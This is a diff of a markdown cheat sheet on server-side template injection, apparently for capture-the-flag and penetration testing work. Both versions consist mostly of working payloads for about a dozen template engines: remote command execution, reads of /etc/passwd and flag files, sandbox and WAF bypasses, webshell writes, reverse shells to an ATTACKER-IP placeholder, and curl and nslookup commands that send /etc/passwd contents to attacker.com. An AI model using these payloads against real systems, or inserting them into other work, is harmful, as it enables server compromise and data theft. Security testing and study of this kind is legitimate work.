@@ -1,1111 +1,170 @@
-# Server-Side Template Injection (SSTI) - Cheat Sheet
+# SSTI — Cheat Sheet
 
-**Comprehensive payload and technique reference for all major template engines**
+Comprehensive payload reference per template engine. Detection workflow + quick reference in `ssti-quickstart.md`. Engine-specific deep dives in `ssti-advanced.md`.
 
----
+## Detection
 
-## Detection Payloads
+### Universal fuzzing string
 
-### Universal Fuzzing String
 ```
 ${{<%[%'"}}%\
 ```
-**Purpose:** Trigger errors revealing template engine name
 
-### Mathematical Expression Tests
-
-```ruby
-<%= 7*7 %>     # ERB (Ruby) - Returns 49
-<%= 7+'7' %>   # ERB - Returns "77"
-```
-
-```python
-{{7*7}}        # Jinja2/Tornado (Python) - Returns 49
-{{7*'7'}}      # Jinja2 - Returns "7777777"
-```
-
-```freemarker
-${7*7}         # Freemarker (Java) - Returns 49
-${7+7}         # Freemarker - Returns 14
-```
-
-```handlebars
-{{7*7}}        # Handlebars (Node.js) - Returns "7*7" (literal)
-```
-
-```django
-{{7*7}}        # Django (Python) - Returns "7*7" (literal)
-```
-
-### Bypassing HTML Sanitization (htmlspecialchars / HTML encoding)
-
-When input is HTML-sanitized before template rendering, double quotes `"` become `&quot;` and break payloads. **Single quotes survive** in PHP's default `htmlspecialchars()` (`ENT_COMPAT` mode, PHP < 8.1):
-```
-# Double-quote payload (BROKEN by htmlspecialchars):
-{{_self.env.registerUndefinedFilterCallback("system")}}
-
-# Single-quote payload (WORKS through htmlspecialchars):
-{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag.txt')}}
-```
-**Rule:** Always try single-quoted payloads first. If both are blocked, try numeric character references or template-native string construction.
-
-### Context-Breaking Tests
+### Math probe by engine
 
 ```
-# Break out of double quotes
-"}{{7*7}}{{
-
-# Break out of single quotes
-'}{{7*7}}{{
-
-# Break out of existing expression
-}}{{7*7}}{{
-
-# Multiple techniques combined
-"}}'}}{{7*7}}
+{{7*7}}        Jinja2 / Twig / Smarty / Liquid → 49
+${7*7}         Freemarker / Velocity / Spring SpEL → 49
+<%= 7*7 %>     ERB → 49
+${{7*7}}       Spring SpEL → 49
+#{7*7}         Ruby ERB / Spring → 49
+*{7*7}         Spring / OGNL → 49
+@{7*7}         Thymeleaf → 49
+{7*7}          Mustache → literal (no expressions)
 ```
 
----
+### HTML sanitization bypass
 
-## Template Engine Payloads
+`htmlspecialchars` default mode strips `&"` but NOT single quotes. Use single quotes:
 
-## ERB (Ruby)
-
-### Basic Syntax
-```erb
-<%= expression %>    # Execute and output
-<% code %>          # Execute without output
-<%# comment %>      # Comment
+```php
+{{ ['cat /flag']|filter('system') }}    # works after htmlspecialchars
 ```
 
-### Command Execution
-```erb
-<%= system("whoami") %>
-<%= `whoami` %>
-<%= exec("whoami") %>
-<%= IO.popen("whoami").read %>
-<%= %x(whoami) %>
-<%= open("|whoami").read %>
+Hex entities for blocked chars:
+```
+&#x27; → '
+&#x22; → "
 ```
 
-### File Operations
-```erb
-<%= File.read('/etc/passwd') %>
-<%= IO.read('/etc/passwd') %>
-<%= File.open('/etc/passwd').read %>
-<%= File.open('/etc/passwd', 'r') { |f| f.read } %>
+### Context breakouts
+
+```
+}}{{<payload>}}                # close expression context
+"}}{{<payload>}}{{             # close string literal
+%22%7d%7d{{<payload>}}{{       # encoded
+{{#comment}}{{/comment}}{{<payload>}}    # break out of comment
 ```
 
-### Directory Listing
-```erb
-<%= Dir.entries('/') %>
-<%= Dir.glob('/*') %>
-<%= `ls -la /` %>
+## ERB (Ruby) / Tornado (Python)
+
 ```
-
-### Environment Variables
-```erb
-<%= ENV %>
-<%= ENV['PATH'] %>
-<%= ENV.keys %>
+ERB:         <%= `id` %>  /  <%= system("id") %>  /  <%= File.read('/etc/passwd') %>
+             <%= IO.popen("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") %>
+             <%= ENV['SECRET_KEY'] %>
+Tornado:     {% import os %}{{ os.popen('id').read() }}
+             {% import os %}{{ os.listdir('/') }}
 ```
-
-### Reverse Shell
-```erb
-<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'") %>
-<%= `nc ATTACKER-IP PORT -e /bin/bash` %>
-```
-
----
-
-## Tornado (Python)
-
-### Basic Syntax
-```python
-{{ expression }}     # Output
-{% code %}          # Execute
-{# comment #}       # Comment
-```
-
-### Command Execution
-```python
-{% import os %}{{os.system('whoami')}}
-{% import subprocess %}{{subprocess.check_output('whoami')}}
-{% import subprocess %}{{subprocess.call(['whoami'])}}
-{% import os %}{{os.popen('whoami').read()}}
-```
-
-### Breaking Out of Context
-```python
-# If inside: {{user.name}}
-user.name}}{% import os %}{{os.system('whoami')
-
-# If inside: {{"text" + user.name}}
-user.name}}{% import os %}{{os.system('whoami')
-```
-
-### File Operations
-```python
-{% import os %}{{open('/etc/passwd').read()}}
-{% import io %}{{io.open('/etc/passwd','r').read()}}
-```
-
-### Module Imports
-```python
-{% import os %}
-{% import sys %}
-{% import subprocess %}
-{% import socket %}
-{% import time %}
-```
-
-### Reverse Shell
-```python
-{% import os %}{{os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'")}}
-```
-
----
 
 ## Jinja2 (Python)
 
-### Basic Syntax
 ```python
-{{ expression }}     # Output
-{% code %}          # Execute
-{# comment #}       # Comment
-{{ var|filter }}    # Filter application
-```
-
-### Configuration Dumping
-```python
-{{ config }}
+# Basic
+{{ 7*7 }}
+{{ config }}                                 # dump app config
 {{ config.items() }}
-{{ config.keys() }}
-{{ config.values() }}
-```
 
-### Object Introspection
-```python
-{{ ''.__class__ }}
-{{ [].__class__ }}
-{{ {}.__class__ }}
+# Object introspection
 {{ ''.__class__.__mro__ }}
-{{ [].__class__.__bases__ }}
-```
-
-### Command Execution via Object Chain
-```python
 {{ ''.__class__.__mro__[1].__subclasses__() }}
-{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
-```
 
-### Built-in Access
-```python
-{{ self.__init__.__globals__.__builtins__ }}
-{{ self.__init__.__globals__.__builtins__.__import__('os').system('whoami') }}
-{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate() }}
-```
+# RCE via subclasses (find Popen index)
+{{ ''.__class__.__mro__[1].__subclasses__()[N]('cat /flag',shell=True,stdout=-1).communicate() }}
 
-### Request Object Access
-```python
-{{ request }}
-{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
-```
+# RCE via globals (preferred)
+{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}              # short
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__.os.popen('id').read() }}
 
-### Cycler Object Exploitation
-```python
-{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
-{{ joiner.__init__.__globals__.os.popen('whoami').read() }}
-{{ namespace.__init__.__globals__.os.popen('whoami').read() }}
-```
+# Builtins access
+{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 
-### File Read
-```python
-{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.__class__.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
-```
+# Request object (Flask)
+{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read() }}
 
----
+# File read
+{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}
+```
 
 ## Freemarker (Java)
 
-### Basic Syntax
-```freemarker
-${expression}           # Output
-<#assign var=value>    # Variable assignment
-<#if test>...</#if>    # Conditional
-<#list seq as item>    # Iteration
-```
+```java
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
 
-### Execute Class (Unsandboxed)
-```freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>
-${ex("whoami")}
-${ex("cat /etc/passwd")}
-${ex("ls -la /")}
-```
-
-### ObjectConstructor Class
-```freemarker
 <#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
-${oc("java.lang.Runtime").getRuntime().exec("whoami")}
+<#assign rt=oc("java.lang.ProcessBuilder", ["cat", "/flag"])>
+${rt.start().inputStream.text}
+
+// File read
+${'java.io.BufferedReader'?new()(java.io.FileReader('/flag')).readLine()}
 ```
 
-### Reflection Chain (Sandboxed Bypass)
-```freemarker
-${object.getClass()}
-${object.getClass().getClassLoader()}
-${object.getClass().getProtectionDomain()}
-${object.getClass().getProtectionDomain().getCodeSource()}
-${object.getClass().getProtectionDomain().getCodeSource().getLocation()}
+## Velocity / Spring SpEL / Apache OGNL
+
 ```
-
-### File Read via Reflection
-```freemarker
-${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+Velocity:    #set($s="")…$s.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id").getInputStream().toString()
+SpEL:        ${T(java.lang.Runtime).getRuntime().exec("id")}
+             ${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec("id").inputStream, T(java.nio.charset.Charset).forName("UTF-8"))}
+OGNL:        %{(#cmd='id').(#runtime=@java.lang.Runtime@getRuntime()).(#runtime.exec(#cmd))}
+OGNL bypass: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(...).(#cmd='id').(#runtime=@java.lang.Runtime@getRuntime()).(#runtime.exec(#cmd))}
 ```
-
-### File Read (Alternative)
-```freemarker
-${product.getClass().getClassLoader().getResource('/etc/passwd').getContent()}
-```
-
-### Class Enumeration
-```freemarker
-${object.getClass().getDeclaredMethods()}
-${object.getClass().getDeclaredFields()}
-${object.getClass().getConstructors()}
-```
-
----
-
-## Handlebars (Node.js)
-
-### Basic Syntax
-```handlebars
-{{ expression }}              # Output
-{{#helper}}...{{/helper}}    # Block helper
-{{! comment }}               # Comment
-```
-
-### RCE via require() - Full Exploit
-```handlebars
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').exec('COMMAND');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
-
-> **If `require` throws ReferenceError** (sandboxed/restricted env): use `process.mainModule.require('child_process').execSync('COMMAND').toString()` instead.
-
-### Alternative Handlebars RCE
-```handlebars
-{{#with "constructor" as |String|}}
-  {{#with (String.sub "0" 0)}}
-    {{#with (Function "return require('child_process').exec('whoami');")}}
-      {{.}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
-
-### Handlebars Helpers Abuse
-```handlebars
-{{#each (lookup this "constructor")}}
-  {{.}}
-{{/each}}
-```
-
----
-
-## Django (Python)
-
-### Basic Syntax
-```django
-{{ variable }}        # Output
-{% tag %}            # Execute tag
-{{ var|filter }}     # Apply filter
-{# comment #}        # Comment
-```
-
-### Debug Information
-```django
-{% debug %}
-```
-
-### Settings Access
-```django
-{{ settings.SECRET_KEY }}
-{{ settings.DATABASES }}
-{{ settings.DEBUG }}
-{{ settings.INSTALLED_APPS }}
-{{ settings.MIDDLEWARE }}
-```
-
-### Request Object
-```django
-{{ request }}
-{{ request.META }}
-{{ request.GET }}
-{{ request.POST }}
-{{ request.COOKIES }}
-{{ request.session }}
-{{ request.user }}
-{{ request.headers }}
-```
-
-### User Object
-```django
-{{ user }}
-{{ user.username }}
-{{ user.email }}
-{{ user.is_superuser }}
-{{ user.groups }}
-```
-
-### Template Variables Enumeration
-```django
-{% for key, value in request.META.items %}
-  {{ key }}: {{ value }}
-{% endfor %}
-```
-
-### Load Module
-```django
-{% load static %}
-{% load admin_urls %}
-```
-
----
 
 ## Twig (PHP)
 
-### Basic Syntax
-```twig
-{{ expression }}     # Output
-{% code %}          # Execute
-{# comment #}       # Comment
-{{ var|filter }}    # Filter
-```
-
-### Command Execution
-```twig
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
-{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
-{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("whoami")}}
-```
-
-### File Read
-```twig
-{{ include("/etc/passwd") }}
-{{ source("/etc/passwd") }}
-```
-
-### Function Call
-```twig
-{{["id"]|filter("system")}}
-{{["cat /etc/passwd"]|filter("system")}}
-{{["id"]|map("system")|join}}
-{{["/etc/passwd"]|map("file_get_contents")|join}}     # LFI via map
-{{[{"http":{"method":"POST","header":"Content-Type: text/xml\r\n","content":body}}]|map("stream_context_set_default")}}  # Set POST context, then file_get_contents(url)
-```
-
-### Environment Access
-```twig
-{{_self.env}}
-{{dump(_self)}}
-{{dump(_context)}}
-```
-
-### `createTemplate()` Sink (direct input → template)
-When PHP code passes user input to `$twig->createTemplate($input)->render(...)`, the entire input is the template — unsandboxed by default even on Twig 3.x. Payloads execute without any context-breaking:
-```twig
-{{["id"]|map("system")|join}}
-```
-**Where to look:** `preview_*`, `render_*`, `email_template_*`, `banner_preview`, `template_test` endpoints. HTML-sanitized inputs (`htmlspecialchars`) still work if payload uses single quotes or no quotes.
-
----
-
-## Pug/Jade (Node.js)
-
-### Basic Syntax
-```pug
-#{expression}    # Output
-- code          # Execute
-// comment      # Comment
-```
-
-### Command Execution
-```pug
-#{function(){return require('child_process').execSync('whoami').toString()}()}
-- var x = require('child_process').execSync('whoami').toString()
-#{x}
-```
-
-### File Read
-```pug
-#{require('fs').readFileSync('/etc/passwd').toString()}
-```
-
----
-
-## Velocity (Java)
-
-### Basic Syntax
-```velocity
-$variable         # Output
-#set($var = "value")  # Variable
-#if($condition)   # Conditional
-## comment        # Comment
-```
-
-### Command Execution
-```velocity
-#set($runtime = $class.forName("java.lang.Runtime"))
-#set($method = $runtime.getDeclaredMethod("getRuntime"))
-#set($process = $method.invoke(null))
-#set($exec = $process.exec("whoami"))
-```
-
-### Class Loader Access
-```velocity
-$class.getClassLoader()
-$class.getClassLoader().loadClass("java.lang.Runtime")
-```
-
----
-
-## Smarty (PHP)
-
-### Basic Syntax
-```smarty
-{$variable}      # Output
-{php}code{/php}  # PHP code (deprecated)
-{* comment *}    # Comment
-```
-
-### Command Execution (Smarty 2)
-```smarty
-{php}system('whoami');{/php}
-{php}echo `whoami`;{/php}
-```
-
-### Command Execution (Smarty 3)
-```smarty
-{system('whoami')}
-{eval('system("whoami");')}
-```
-
-### File Read
-```smarty
-{file_get_contents('/etc/passwd')}
-```
-
----
-
-## Cheetah (Python)
-
-Used by Cobbler, older Python web apps. Syntax is `#`-directive + `$var`, distinct from Jinja2/Tornado `{{}}`.
-
-### Basic Syntax
-```cheetah
-$var              # Output variable
-#set $x = 1       # Assignment
-#if $cond         # Conditional
-## comment
-```
-
-### Detection
-`{{7*7}}` returns literal `{{7*7}}`. Instead test:
-```cheetah
-#set $x = 7*7
-$x
-```
-If `49` renders, it's Cheetah (or similar `#`-directive engine).
-
-### Command Execution — `__import__()` Bypass
-Cheetah honors `cheetah_import_whitelist` for `#import` statements, but Python's `__import__()` builtin is NOT in that whitelist. When `os`/`subprocess` are blocked at the `#import` directive:
-```cheetah
-#set $os = __import__("os")
-#set $r = $os.popen("id").read()
-$r
-```
-
-### File Read
-```cheetah
-#set $f = open("/etc/passwd")
-$f.read()
-```
-
-### Why this matters (Cobbler)
-Cobbler renders kickstart/autoinstall templates via Cheetah as root. Injecting a template through the `write_autoinstall_template` XMLRPC then triggering `generate_autoinstall` yields root RCE. Whitelist is restrictive (`['random', 're', 'time', 'netaddr']`) but `__import__()` bypasses it trivially.
-
----
-
-## Mako (Python)
-
-### Basic Syntax
-```mako
-${expression}    # Output
-<% code %>       # Execute
-## comment       # Comment
-```
-
-### Command Execution
-```mako
-${__import__('os').system('whoami')}
-<% import os; os.system('whoami') %>
-```
-
-### File Read
-```mako
-${open('/etc/passwd').read()}
-${open('/flag.txt').read()}
-```
-
-### Character Substitution Bypass (Font/Encoding Passthrough)
-
-When an app transforms input through character mapping (e.g., font substitution, Unicode transliteration), check if **any mapping preserves SSTI-critical characters** (`$`, `{`, `}`, `<`, `%`, `>`). If one font/mapping passes these through unchanged, SSTI is possible even when the app appears to only do "cosmetic" text transformation.
-
-**Pattern:** App has multiple font/encoding mappings. Most replace chars → safe Unicode glyphs. But one mapping (often the "plain" or "default" font) passes `${}` verbatim → Mako renders it.
-
-```mako
-# Input through passthrough font:
-${open('/flag.txt').read()}
-
-# If os module needed:
-${__import__('os').popen('id').read()}
-```
-
-**Detection:** Submit `${7*7}` — if any output column shows `49`, that column's mapping is vulnerable.
-
----
-
-## Common Attack Patterns
-
-### Breaking Out of Contexts
-
-**Double Quote String:**
-```
-"}{{7*7}}{{
-"}}<%= 7*7 %>{{"
-"}}${7*7}${{
-```
-
-**Single Quote String:**
-```
-'}{{7*7}}{{
-'}}<%= 7*7 %>{{'
-'}}${7*7}${{
-```
-
-**Expression Context:**
-```
-}}{{7*7}}{{
-%><%= 7*7 %><%
-}${7*7}${
-```
-
-**HTML Attribute:**
-```
-" onload="alert(1)">{{7*7}}
-' onload='alert(1)'>{{7*7}}
-```
-
----
-
-## Blind SSTI Detection
-
-### DNS Exfiltration
-
-**ERB:**
-```erb
-<%= `nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` %>
-<%= `nslookup attacker.com` %>
-```
-
-**Python:**
-```python
-{% import os %}{{os.system('nslookup BURP-COLLABORATOR-SUBDOMAIN')}}
-```
-
-**Freemarker:**
-```freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>
-${ex("nslookup BURP-COLLABORATOR-SUBDOMAIN")}
-```
-
-### HTTP Exfiltration
-
-**ERB:**
-```erb
-<%= `curl http://BURP-COLLABORATOR-SUBDOMAIN` %>
-<%= `wget http://BURP-COLLABORATOR-SUBDOMAIN` %>
-```
-
-**Python:**
-```python
-{% import urllib %}{{urllib.request.urlopen('http://BURP-COLLABORATOR-SUBDOMAIN')}}
-```
-
-### Time-Based Detection
-
-**ERB:**
-```erb
-<%= sleep(10) %>
-```
-
-**Python:**
-```python
-{% import time %}{{time.sleep(10)}}
-```
-
-**Java:**
-```freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>
-${ex("sleep 10")}
-```
-
----
-
-## Data Exfiltration
-
-### ERB (Ruby)
-```erb
-<%= `curl http://attacker.com/?data=$(cat /etc/passwd | base64)` %>
-<%= `nslookup $(whoami).attacker.com` %>
-```
-
-### Python
-```python
-{% import os %}{{os.system('curl http://attacker.com/?data=$(cat /etc/passwd | base64)')}}
-```
-
-### Freemarker (Java)
-```freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>
-${ex("curl http://attacker.com/?data=$(cat /etc/passwd | base64)")}
-```
-
----
-
-## Reverse Shells
-
-### ERB (Ruby)
-```erb
-<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'") %>
-<%= `nc ATTACKER-IP PORT -e /bin/bash` %>
-<%= `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("ATTACKER-IP",PORT))'` %>
-```
-
-### Python
-```python
-{% import os %}{{os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'")}}
-{% import os %}{{os.system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER-IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'")}}
-```
+```php
+{{ 7*7 }}
+{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}        # Twig 1.x
+{{ ['id'] | filter('system') }}        # Twig 2.x/3.x
+{{ ['id'] | map('system') }}
+{{ ['id'] | sort('system') }}
+{{ ['id'] | reduce('system') }}
 
-### Node.js (Handlebars)
-```handlebars
-{{#with "s" as |string|}}...require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1"')...{{/with}}
+# Bypass disable_functions via file_put_contents (sort callback)
+{{['<?php system($_GET[0]); ?>','/var/www/html/shell.php']|sort('file_put_contents')}}
 ```
 
----
+## Node.js engines (Handlebars / EJS / Nunjucks / Pug)
 
-## Sandbox Bypass Techniques
-
-### Java Reflection (Freemarker)
-```freemarker
-${object.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
-```
-
-### Python MRO Traversal (Jinja2)
-```python
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
-```
-
-### Class Loader Manipulation (Java)
-```freemarker
-${object.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null)}
-```
-
-### Built-in Access (Python)
-```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
-{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
-```
-
----
-
-## WAF Bypass Techniques
-
-### Encoding
-```
-# URL encoding
-%3C%25%3D%20system("whoami")%20%25%3E
-
-# Double encoding
-%253C%2525%253D%2520system("whoami")%2520%2525%253E
-
-# Unicode
-\u003c%= system("whoami") %\u003e
-```
-
-### Case Variation
-```
-${SyStEm("whoami")}
-${SYSTEM("whoami")}
-```
-
-### String Concatenation
-```ruby
-<%= "sys"+"tem"("whoami") %>
-<%= ["sys","tem"].join.to_sym.("whoami") %>
-```
-
-### Alternative Syntax
-```python
-# Instead of os.system
-{% import subprocess %}{{subprocess.call(['whoami'])}}
-{% import subprocess %}{{subprocess.check_output('whoami')}}
-{% import os %}{{os.popen('whoami').read()}}
-```
-
----
-
-## Enumeration Payloads
-
-### List Available Objects (Django)
-```django
-{% debug %}
-{{ request }}
-{{ settings }}
-```
-
-### List Methods (Freemarker)
-```freemarker
-${object.getClass().getDeclaredMethods()}
-${object.getClass().getMethods()}
-```
-
-### List Attributes (Python)
-```python
-{{ object.__dict__ }}
-{{ dir(object) }}
-```
-
-### Environment Variables
-```erb
-<%= ENV %>
-```
-
-```python
-{% import os %}{{os.environ}}
-```
-
----
-
-## Filter/Function Reference
-
-### Jinja2 Filters
-```python
-{{ text|upper }}           # Uppercase
-{{ text|lower }}           # Lowercase
-{{ text|replace("a","b") }} # Replace
-{{ list|join(",") }}       # Join
-{{ text|escape }}          # HTML escape
-{{ text|safe }}            # Mark safe (no escape)
-{{ text|length }}          # Length
-```
-
-### Django Filters
-```django
-{{ text|upper }}
-{{ text|lower }}
-{{ text|title }}
-{{ list|join:", " }}
-{{ date|date:"Y-m-d" }}
-{{ text|truncatewords:10 }}
-```
-
-### Freemarker Built-ins
-```freemarker
-${"text"?upper_case}
-${"text"?lower_case}
-${"text"?length}
-${"ClassName"?new()}    # Dangerous!
-${sequence?size}
-```
-
----
-
-## Common Mistakes and Fixes
-
-### Mistake: Not URL Encoding
-```
-❌ /?param=<%= 7*7 %>
-✓ /?param=%3C%25%3D+7*7+%25%3E
-```
-
-### Mistake: Wrong Engine Syntax
-```
-❌ Django: {{os.system('whoami')}}
-✓ Django: {{settings.SECRET_KEY}}
-```
-
-### Mistake: Not Breaking Out
-```
-❌ Template: {{user.name}}
-   Payload: system("whoami")
-   Result: {{user.system("whoami")}}
-
-✓ Template: {{user.name}}
-   Payload: name}}{{7*7}}
-   Result: {{user.name}}{{7*7}}
-```
-
-### Mistake: Missing Parameters
-```
-❌ user.setAvatar('/etc/passwd')
-✓ user.setAvatar('/etc/passwd','image/jpg')
-```
-
----
-
-## Conversion Utilities
-
-### ASCII Decimal to Text (Lab 7)
-```python
-# Python
-ascii_values = [109, 121, 112, 97, 115, 115]
-text = ''.join(chr(val) for val in ascii_values)
-print(text)  # mypass
-```
-
-```bash
-# Bash
-echo "109 121 112 97 115 115" | awk '{for(i=1;i<=NF;i++)printf("%c",$i)}'
-```
-
-```javascript
-// JavaScript
-const ascii = [109, 121, 112, 97, 115, 115];
-const text = String.fromCharCode(...ascii);
-console.log(text);  // mypass
-```
-
-### Base64 Encoding
-```ruby
-<%= `echo 'data' | base64` %>
-```
-
-```python
-{% import base64 %}{{base64.b64encode(b'data')}}
-```
-
----
-
-## Testing Checklist
-
-- [ ] Test GET parameters
-- [ ] Test POST parameters
-- [ ] Test HTTP headers (User-Agent, Referer, etc.)
-- [ ] Test file upload content
-- [ ] Test JSON/XML input
-- [ ] Test cookie values
-- [ ] Test WebSocket messages
-- [ ] Check for blind SSTI with callbacks
-- [ ] Test time-based detection
-- [ ] Try multiple template engines
-- [ ] Test breaking out of contexts
-- [ ] Enumerate available objects
-- [ ] Read documentation for custom engines
-- [ ] Chain multiple vulnerabilities
-
----
-
-## Burp Suite Integration
-
-### Intruder Payload List
-```
-${7*7}
-{{7*7}}
-<%= 7*7 %>
-#{7*7}
-${{7*7}}
-@{7*7}
-#{7*7}
-*{7*7}
-${{<%[%'"}}%\
-```
-
-### Collaborator Payloads
-```erb
-<%= `nslookup §COLLABORATOR§` %>
-```
-
-```python
-{% import os %}{{os.system('nslookup §COLLABORATOR§')}}
-```
-
-```freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup §COLLABORATOR§")}
-```
-
----
-
-## Real-World Examples
-
-### Email Template SSTI
 ```
-Subject: {{user.name}}
-Body: Dear {{user.name}}, ...
-
-Exploit: name}}{% import os %}{{os.system('whoami')
+EJS:         <%= require('child_process').execSync('id').toString() %>
+Nunjucks:    {{range.constructor("return require('child_process').execSync('id').toString()")()}}
+Pug:         - var process = global.process / = process.mainModule.require('child_process').execSync('id')
+Handlebars:  Long lookup chain (constructor / split / each) — see ssti-advanced.md
 ```
 
-### PDF Generator SSTI
-```
-Invoice for: {{company_name}}
+## Mako / Smarty / Thymeleaf / JSP EL
 
-Exploit: company_name}}<%= system("whoami") %>
 ```
-
-### CMS Template SSTI
-```html
-<div class="{{theme}}">Content</div>
-
-Exploit: theme}}<%= `whoami` %>{{
+Mako:        ${__import__('os').popen('cat /flag').read()}
+Smarty:      {system('id')}  /  {passthru('cat /flag')}
+             {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[0]); ?>",self::clearConfig())}
+Thymeleaf:   __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+JSP EL:      ${''.getClass().forName('java.lang.Runtime').getMethod('exec',[Ljava.lang.String;).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),new String[]{'id'})}
 ```
-
----
-
-## Tool Recommendations
-
-**Detection:**
-- Burp Scanner
-- OWASP ZAP
-- tplmap (https://github.com/epinna/tplmap)
-
-**Exploitation:**
-- Burp Repeater
-- curl with custom payloads
-- Custom Python/Ruby scripts
-
-**Blind Detection:**
-- Burp Collaborator
-- Interactsh (https://github.com/projectdiscovery/interactsh)
-- RequestBin
-
----
-
-## Quick Reference Table
-
-| Engine | Language | Output | Execute | RCE Function |
-|--------|----------|--------|---------|--------------|
-| ERB | Ruby | `<%= %>` | `<% %>` | `system()` |
-| Tornado | Python | `{{}}` | `{% %}` | `os.system()` |
-| Jinja2 | Python | `{{}}` | `{% %}` | `os.system()` |
-| Django | Python | `{{}}` | `{% %}` | N/A (limited) |
-| Freemarker | Java | `${}` | `<#>` | `Execute` class |
-| Handlebars | Node.js | `{{}}` | `{{#}}` | `require()` |
-| Twig | PHP | `{{}}` | `{% %}` | `system()` |
-| Smarty | PHP | `{}` | `{php}` | `system()` |
-| Velocity | Java | `$` | `#` | `Runtime.exec()` |
-| Cheetah | Python | `$var` | `#directive` | `__import__("os").popen()` |
-
----
-
-## Python eval()/exec() Code Injection
 
-**When to test:** Any Python app that renders dynamic templates or processes user input through `eval()`, `exec()`, `compile()`, or f-string formatting with `eval()`.
+## Sandbox escapes, filter bypasses, file-read
 
-**Detection signals:**
-- Error messages containing `eval()`, `exec()`, `NameError`, `SyntaxError` in Python tracebacks
-- Input reflected inside curly braces `{}` in responses (f-string rendering)
-- `[EVAL_ERROR]` or similar custom error wrappers
-
-**Basic payloads (no spaces needed):**
 ```
-{7*7}                                    # Arithmetic test → 49
-{open("/etc/passwd").read()}             # File read
-{__import__("os").popen("id").read()}    # Command execution
-{__import__("os").popen("whoami").read()} # Whoami
-```
-
-**Regex filter bypasses:**
-- **Space bypass:** `chr(32)` → `{__import__("os").popen("cat"+chr(32)+"/etc/passwd").read()}`
-- **Comma bypass:** Use single-arg functions or `chr()` concatenation
-- **Underscore bypass:** `getattr(getattr(__builtins__,chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2)("os"),"popen")("id").read()`
-- **Quote bypass:** `chr()` for string construction
-- **Dot bypass:** `getattr()` instead of attribute access
-
-**f-string eval pattern** (`eval(f"f'''{template}'''")`):
-- Curly braces `{}` inside f-strings execute arbitrary Python expressions
-- Even with regex allowlists, if `{}().'"` are permitted → full code execution
-- Test: inject `{7*7}` in any field — if `49` appears in output, eval injection confirmed
-
----
-
-**Remember:** Always obtain proper authorization before testing for SSTI vulnerabilities. Unauthorized testing is illegal.
-
----
